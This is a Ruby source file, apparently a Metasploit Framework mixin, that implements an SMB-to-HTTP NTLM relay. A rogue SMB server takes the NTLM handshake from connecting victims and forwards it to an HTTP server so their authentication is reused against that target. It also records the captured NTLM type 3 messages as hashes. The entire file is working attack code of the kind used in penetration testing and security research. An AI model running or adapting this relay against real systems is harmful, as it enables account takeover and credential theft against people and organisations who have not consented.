###
#
# This mixin provides support for relaying smb logins to http servers
#
###

module Msf::Exploit::Remote::SMB::Server::HttpRelay
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::NTLM::Client
  include Msf::Exploit::Remote::SMB::Server::HashCapture

  def post_login_action(client_socket, opts = {})
    # overload for behavior after login
  end

  def http_client
    return @http_client unless @http_client.nil?

    @http_client = Rex::Proto::Http::Client.new(datastore['RHOST'],
                                                datastore['RPORT'],
                                                {},
                                                datastore['SSL'],
                                                datastore['ssl_version'],
                                                proxies,
                                                nil,
                                                nil)
    @http_client.connect
    return @http_client
  rescue Exception => e
    print_error(e.to_s)
    elog("Error connecting to Relay Target:\n #{e}")
    raise e
    return nil
  end

  def initial_handshake
    vprint_status('Sending NTLM Handshake to HTTP Relay Target')
    req = http_client.request_raw(
      {
        'method' => 'GET',
        'uri' => @login_uri,
        'headers' => {
          'Accept-Encoding' => 'identity'
        }
      }
    )
    res = http_client._send_recv(req, 20, true)
    return false if res.code != 401

    return true
  rescue Exception => e
    print_error(e.to_s)
    elog("Error on initial handshake:\n #{e}")
    close http_client
    raise e
    return false
  end

  def relay_ntlm_type1(ntlm_type1)
    vprint_status('Relaying NTLM Message 1 to HTTP Target')
    return nil unless initial_handshake

    # required to call encode64 on ntlm message
    ntlm_type1.domain.force_encoding('ASCII-8BIT')
    ntlm_type1.workstation.force_encoding('ASCII-8BIT')
    req = http_client.request_raw(
      {
        'method' => 'GET',
        'uri' => @login_uri,
        'headers' => {
          'Accept-Encoding' => 'identity',
          'Authorization' => 'NTLM ' + ntlm_type1.encode64
        }
      }
    )
    res = http_client._send_recv(req, 20, true)
    @ntlm_type1 = ntlm_type1
    ntlm_type2_b64 = res.headers['WWW-Authenticate'].split[1]
    ntlm_type2 = Net::NTLM::Message.decode64(ntlm_type2_b64)
    @ntlm_type2 = ntlm_type2
    vprint_status('Relaying NTLM Message 2 to SMB Target')
    return @ntlm_type2
  rescue Exception => e
    print_error(e.to_s)
    elog("Error relaying NTLM Type 1 Message:\n #{e}")
    raise e
    return nil
  end

  def relay_ntlm_type3(ntlm_type3)
    vprint_status('Received NTLM Type 3 from SMB Client')

    # required to call encode64 on ntlm message
    ntlm_type3.domain = ntlm_type3.domain.force_encoding('ASCII-8BIT')
    ntlm_type3.user = ntlm_type3.user.force_encoding('ASCII-8BIT')
    ntlm_type3.workstation = ntlm_type3.workstation.force_encoding('ASCII-8BIT')
    @ntlm_type3 = ntlm_type3
    vprint_status('Relaying NTLM Type 3 to HTTP Target')
    req = http_client.request_raw(
      {
        'method' => 'GET',
        'uri' => @login_uri,
        'headers' => {
          'Accept-Encoding' => 'identity',
          'Authorization' => 'NTLM ' + ntlm_type3.encode64
        }
      }
    )
    res = http_client._send_recv(req, 20, true)
    return false unless res&.code == 401

    report_ntlm_type3(
      address: datastore['RHOST'],
      ntlm_type1: @ntlm_type1,
      ntlm_type2: @ntlm_type2,
      ntlm_type3: @ntlm_type3
    )
    return true
  rescue Exception => e
    print_error(e.to_s)
    elog("Error relaying NTLM Type 3 Message:\n #{e}")
    raise e
  end

  class HTTPRelayNTLMProvider < ::RubySMB::Gss::Provider::NTLM
    # @param [::WindowsError::NTStatus] ntlm_type3_status A specific NT Status to return as the response to the NTLM
    #   type 3 message. If this value is nil, the message will be processed as normal.
    def initialize(allow_anonymous: false, allow_guests: false, default_domain: 'WORKGROUP', listener: nil, ntlm_type3_status: ::WindowsError::NTStatus::STATUS_ACCESS_DENIED)
      super(allow_anonymous: allow_anonymous, allow_guests: allow_guests, default_domain: default_domain)
      @listener = listener
      @ntlm_type3_status = ntlm_type3_status
    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      HTTPRelayAuthenticator.new(self, server_client)
    end

    attr_reader :listener
    attr_accessor :ntlm_type3_status
  end

  class HTTPRelayAuthenticator < ::RubySMB::Gss::Provider::NTLM::Authenticator

    def process_ntlm_type1(type1_msg)
      @ntlm_type1 = type1_msg
      @ntlm_type2 = @provider.listener.relay_ntlm_type1(type1_msg)
      @ntlm_type2
    end

    def process_ntlm_type3(type3_msg)
      @provider.listener.relay_ntlm_type3(type3_msg)
      client_socket = @provider.listener.http_client
      @provider.listener.post_login_action(client_socket)
      client_socket.close
      return @provider.ntlm_type3_status unless @provider.ntlm_type3_status.nil?
    end

  end
end
